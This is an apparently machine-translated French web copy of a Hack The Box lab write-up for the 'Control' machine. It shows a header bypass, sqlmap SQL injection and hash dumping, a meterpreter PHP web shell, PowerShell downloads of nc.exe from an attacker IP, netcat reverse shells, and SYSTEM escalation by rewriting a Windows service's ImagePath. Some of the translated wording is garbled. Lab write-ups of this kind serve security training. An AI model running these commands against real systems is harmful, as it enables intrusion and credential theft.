<!doctype html>
<html class="no-js" lang="fr">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🌕 👛 🕒 Hack The Box. Contrôle de passage. Injection SQL et LPE via les droits de service 🧙 🛀🏼 🎊</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Je continue de publier des solutions envoyées pour un traitement ultérieur à partir du site HackTheBox . 
 
 Dans cet article, nous pénétrons le systè...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Hack The Box. Contrôle de passage. Injection SQL et LPE via les droits de service</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/499060/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/y_/ag/j1/y_agj1md5zinn0p_o8ucn6nrcfq.png" alt="image"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Je continue de publier des solutions envoyées pour </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">un traitement ultérieur à</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> partir du site </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans cet article, nous pénétrons le système par injection SQL, plongeons dans l'historique de la ligne de commande et augmentons nos privilèges grâce aux droits sur le service. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La connexion au laboratoire se fait via VPN. </font><font style="vertical-align: inherit;">Il est recommandé de ne pas se connecter à partir d'un ordinateur de travail ou d'un hôte où les données importantes pour vous sont disponibles, car vous vous retrouvez sur un réseau privé avec des personnes qui connaissent quelque chose dans le domaine de la sécurité de l'information :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Information organisationnelle</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recon</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cette machine a une adresse IP 10.10.10.167, que j'ajoute à / etc / hosts.</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.167    control.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout d'abord, nous analysons les ports ouverts. </font><font style="vertical-align: inherit;">Puisqu'il faut beaucoup de temps pour analyser tous les ports avec nmap, je vais d'abord le faire avec masscan. </font><font style="vertical-align: inherit;">Nous analysons tous les ports TCP et UDP à partir de l'interface tun0 à une vitesse de 1000 paquets par seconde.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.167   --rate=1000</code></pre><br>
<img src="https://habrastorage.org/webt/zg/fy/fu/zgfyfurcecpe-cka_lnykhsrcne.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, pour des informations plus détaillées sur les services qui fonctionnent sur les ports, nous allons exécuter une analyse avec l'option -A.</font></font><br>
<pre><code class="bash hljs">nmap -A control.htb -p80,135,3306,49667,49666</code></pre><br>
<img src="https://habrastorage.org/webt/eo/ql/7a/eoql7aimt9_z47br5j4v_vmfzai.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L'hôte exécute un serveur Web. Voyons ce qu'il y a. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/jg/gj/eg/jggjeg_agns8gedjluaymnrgmuc.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous voyons qu'il y a un lien vers le panneau d'administration. Mais nous sommes informés qu'il n'y a pas d'en-tête et nous devons contacter via un proxy. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ty/qu/zn/tyquznnocwmjntlmqzrfa2exkeq.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans le même temps, dans le code source de la page de démarrage, nous trouvons le message: </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ww/rb/ht/wwrbhtb-ecfdehebmwvxaorailq.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En comparant ce dont vous avez besoin pour utiliser le proxy et l'adresse trouvée, nous supposons que vous devez le parcourir. Le proxy est affiché dans le protocole HTTP dans l'en-tête x-forwarded-for. Exposons-le. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xt/7v/gz/xt7vgzpnuhaxx7wwxt_t1a8mjgm.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous allons avec succès à la page d'administration. Passons par le navigateur. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/k6/9v/jt/k69vjt9fkb-slnguropll7g4yws.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais lorsque vous essayez de faire quelque chose, ils nous jettent sur une page avec un message proxy. En effet, nous ne remplaçons pas l'en-tête trouvé. Afin de ne pas le faire à chaque fois dans Burp Suite, dans l'onglet Proxy -&gt; Options, nous trouvons la fonction «Match and Replace».</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ee/bp/jx/eebpjxadru01wuroipptxqtqx-q.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et ajoutez une nouvelle entrée qui ajoutera automatiquement cet en-tête à toutes les demandes sortantes. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ts/qi/xp/tsqixpvs8glppx4sw6zrt9byo_k.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et en testant le champ de recherche, nous trouvons l'injection SQL. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/rl/0n/bn/rl0nbntyfysfaidg_kmx6jrqpk0.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pour le fonctionnement, nous utilisons sqlmap. </font><font style="vertical-align: inherit;">Enregistrons cette demande dans un fichier (Copier dans un fichier) et exécutons sqlmap, en passant ce fichier comme paramètre.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req</code></pre><br>
<img src="https://habrastorage.org/webt/c9/ir/pl/c9irplxxa0exy0byxlfofpmtvk8.png" alt="image"><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Point d'entrée</font></font></b><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
Voyons quelles bases de données sont disponibles.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req --dbs</code></pre><br>
<img src="https://habrastorage.org/webt/s_/2z/t_/s_2zt_w40pnldgxyt-cmxmzkvfw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voyons quelles informations d'identification sont disponibles. </font><font style="vertical-align: inherit;">Voyons toutes les tables de la base de données mysql.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req -D mysql --tables</code></pre><br>
<img src="https://habrastorage.org/webt/ke/-v/je/ke-vje10bm0a0wxqsvtbkloeetu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous nous intéressons donc à la table des utilisateurs. </font><font style="vertical-align: inherit;">Obtenons les noms de toutes les colonnes.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req -D mysql -T user --columns</code></pre><br>
<img src="https://habrastorage.org/webt/19/gw/or/19gworxp_r4qy1kxbey7yvbtuko.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
De toutes les colonnes, les plus intéressantes sont Utilisateur et Mot de passe. </font><font style="vertical-align: inherit;">Nous apprenons ce qu'il y a en eux.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req -D mysql -T user -C User,Password --dump</code></pre><br>
<img src="https://habrastorage.org/webt/e-/76/b4/e-76b4pv25daqhkvxf-zwhqha1g.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La base de données contient plusieurs utilisateurs. </font><font style="vertical-align: inherit;">Sqlmap propose de cracker les hachages. </font><font style="vertical-align: inherit;">Nous sélectionnons une attaque par dictionnaire, indiquons que nous voulons utiliser notre dictionnaire et écrivons le chemin vers rockyou. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/og/fp/us/ogfpusgoxax5y4oby4r4isautx8.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Après quelques secondes, nous recevrons un tableau avec les noms d'utilisateur et les hachages de leurs mots de passe. </font><font style="vertical-align: inherit;">Si sqlmap a réussi à casser le mot de passe, il l'indiquera à côté du hachage entre parenthèses. </font><font style="vertical-align: inherit;">Comme vous pouvez le voir, nous avons les informations d'identification de l'utilisateur hector. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/3l/wh/pp/3lwhppkhebq6-zciqhxufbergyg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Je n'ai pas pu obtenir le shell en utilisant sqlmap, mais en écrivant des fichiers. </font><font style="vertical-align: inherit;">Posons le Web a marché. </font><font style="vertical-align: inherit;">Tout d'abord, nous générons la charge de meterpreter au format PHP.</font></font><br>
<pre><code class="bash hljs">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.15.82 LPORT=4321 -f raw &gt; r.php<font></font>
cat r.php | xclip -selection clipboard &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;?php '</span> | tr -d <span class="hljs-string">'\n'</span> &gt; r.php &amp;&amp; xclip -selection clipboard -o &gt;&gt; r.php</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, écrivez-le en utilisant sqlmap dans le répertoire du serveur Web.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req --file-write=/home/ralf/tmp/r.php --file-dest=C:/inetpub/wwwroot/r.php</code></pre><br>
<img src="https://habrastorage.org/webt/f-/ov/hr/f-ovhrbjd12vmuczfbltop8nzya.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le fichier a été écrit avec succès. </font><font style="vertical-align: inherit;">Exécutez l'écouteur. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/n_/8-/ql/n_8-qly45zo-_ihgxv9v54g5fwu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et tournez-vous vers votre fichier sur le serveur Web.</font></font><br>
<pre><code class="bash hljs">curl http://control.htb/r.php</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans la fenêtre Metasploit, nous observons une connexion réussie. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/qy/bp/yy/qybpyydcw15sv7zk5borirt75jc.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Accédez à cette session. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ah/fu/3f/ahfu3f12oacub1nb_pbc4nu0flg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais voici le problème, nous ne pouvons pas exécuter de commandes via le shell. De plus, de telles tentatives réinitialisent la connexion. </font><font style="vertical-align: inherit;">Essayons de contourner le verrou en créant un processus PowerShell en mode interactif (-i) caché à la vue (-H) et en passant notre commande en tant que paramètres (-a). </font><font style="vertical-align: inherit;">Voyons sous quel utilisateur nous travaillons.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/tg/c1/ph/tgc1photow2juvshqy_imh2wop0.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UTILISATEUR</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous avons des informations d'identification Hector, nous verrons s'il y a un tel utilisateur dans le système. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/4r/tw/9h/4rtw9hec22vofi3vvcjfn2bgqza.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il y a un tel utilisateur! </font><font style="vertical-align: inherit;">Mais d'abord, découvrez le nom de la voiture. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/_0/q1/yd/_0q1ydmzwb0jg10dxhfcd5gdszm.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous avons un nom d'utilisateur, un mot de passe, un domaine et un nom de machine. </font><font style="vertical-align: inherit;">Vérifions maintenant si les informations d'identification que nous avons reçues sont appropriées. </font><font style="vertical-align: inherit;">Pour ce faire, exécutez «whoami» au nom d'Hector.</font></font><br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'Control\Hector' ; <span class="hljs-variable">$password</span> = 'l33th4x0rhector' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername Fidelity -credential <span class="hljs-variable">$credential</span> -scriptblock { whoami }"</span> -i -H</code></pre><br>
<img src="https://habrastorage.org/webt/f7/zv/gz/f7zvgzzrv5rymzoknsodblm8qqw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bien. </font><font style="vertical-align: inherit;">Prenons la coquille. </font><font style="vertical-align: inherit;">Exécutez le serveur Web sur l'hôte local.</font></font><br>
<pre><code class="bash hljs">python3 -m http.server 80</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et téléchargez sur l'hôte Netcat distant.</font></font><br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'Control\Hector' ; <span class="hljs-variable">$password</span> = 'l33th4x0rhector' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername Fidelity -credential <span class="hljs-variable">$credential</span> -scriptblock { iwr 10.10.15.82/nc.exe -o C:\\Users\\Hector\\Documents\\nc.exe }"</span> -i -H</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ouvrez maintenant le port 5432. </font><font style="vertical-align: inherit;">nc -lvp 5432 et effectuez la connexion inverse à partir de l'hôte distant.</font></font><br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'Control\Hector' ; <span class="hljs-variable">$password</span> = 'l33th4x0rhector' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername Fidelity -credential <span class="hljs-variable">$credential</span> -scriptblock { C:\\Users\\Hector\\Documents\\nc.exe -e powershell 10.10.15.82 5432 }"</span> -i -H</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous prenons donc l'utilisateur.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/z6/wu/-v/z6wu-vdgfchbqaobjsq83pdpdpe.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RACINE</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
De plus, lorsque nous essayons de télécharger l'un des moyens de collecter des informations de l'hôte vers l'hôte (tels que </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BloodHound</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerUp</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JAWS</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WinPEAS</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ), nous remarquons que le défenseur les supprime. </font><font style="vertical-align: inherit;">Mais WinPEAS a une </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">version de chauve</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">souris</font></a><font style="vertical-align: inherit;"> qui ne peut pas être désinstallée. </font><font style="vertical-align: inherit;">Nous le téléchargeons sur l'hôte et l'exécutons. </font><font style="vertical-align: inherit;">De plus, il est seulement nécessaire d'examiner attentivement les informations collectées. </font><font style="vertical-align: inherit;">Et nous trouvons un fichier intéressant ConsoleHost_history.txt. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/k3/oe/z4/k3oez4vknoc6njwzz0tvs_wav8i.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Regardez ce qu'il contient.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wy/pr/av/wypravr1cr2pa2im8on8yl34rew.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ces équipes sont la seule chose que nous avons. </font><font style="vertical-align: inherit;">L'applet de commande Get-Acl récupère les objets qui représentent un descripteur de sécurité pour un fichier ou une ressource. </font><font style="vertical-align: inherit;">Le descripteur de sécurité contient des listes de contrôle d'accès aux ressources (ACL). </font><font style="vertical-align: inherit;">L'ACL contient les autorisations requises par les utilisateurs et les groupes d'utilisateurs pour accéder à la ressource. </font><font style="vertical-align: inherit;">J'ai donc décidé que le chemin de la solution réside dans les services et leur accès. </font><font style="vertical-align: inherit;">Obtenons-leur tous les services et autorisations d'Hector.</font></font><br>
<br>
<pre><code class="bash hljs">get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i <span class="hljs-string">"Hector Users Path"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En regardant à travers la sortie, nous remarquons que Hector a tous les droits sur le service de mise à jour Windows - wuauserv. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sp/je/pk/spjepkdg3e1zsisqo8vhvz_1gmk.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Les services du système d'exploitation Windows s'exécutent avec des privilèges système. </font><font style="vertical-align: inherit;">Lors de l'enregistrement d'un service dans le système, le chemin d'accès au fichier exécutable du service est protégé dans l'attribut ImagePath. </font><font style="vertical-align: inherit;">Modifions la valeur de cet attribut et chargeons le shell.</font></font><br>
<pre><code class="bash hljs">reg add <span class="hljs-string">"HKLM\System\CurrentControlSet\Services\wuauserv"</span> /v ImagePath /t REG_SZ /d <span class="hljs-string">"C:\Users\Hector\Documents\nc.exe -e powershell 10.10.15.82 6543"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Démarrez maintenant le service de mise à jour.</font></font><br>
<pre><code class="bash hljs">start-service wuauserv</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous obtenons un shell avec des privilèges maximum. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/im/w1/tq/imw1tqnkohjh-qs-nvwbuggywoy.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous pouvez nous rejoindre sur </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Vous y trouverez du matériel intéressant, des cours fusionnés ainsi que des logiciels. </font><font style="vertical-align: inherit;">Créons une communauté dans laquelle il y aura des gens qui connaissent bien de nombreux domaines de l'informatique, puis nous pourrons toujours nous entraider pour tout problème informatique et de sécurité de l'information.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr499048/index.html">Sol Levante: comment ils ont fait l'anime en 4K et HDR pour Netflix</a></li>
<li><a href="../fr499052/index.html">Stockage de données externes: de l'époque d'IBM 1311 à nos jours. Partie 2</a></li>
<li><a href="../fr499054/index.html">Leader dans un nouvel endroit: l'instruction de survie</a></li>
<li><a href="../fr499056/index.html">Comment Amazon est organisé</a></li>
<li><a href="../fr499058/index.html">Qui s'engage dans l'audio profond et pourquoi est-il nécessaire</a></li>
<li><a href="../fr499062/index.html">Petits problèmes de physique</a></li>
<li><a href="../fr499064/index.html">Compréhension contextuelle alternative à l'aide d'un modèle de langage statistique</a></li>
<li><a href="../fr499068/index.html">Définition des paramètres de transformation du nuage de points</a></li>
<li><a href="../fr499070/index.html">ПШЕ AndroidStudio ou comment utiliser pleinement les outils VCS</a></li>
<li><a href="../fr499086/index.html">Dask Home Cluster</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>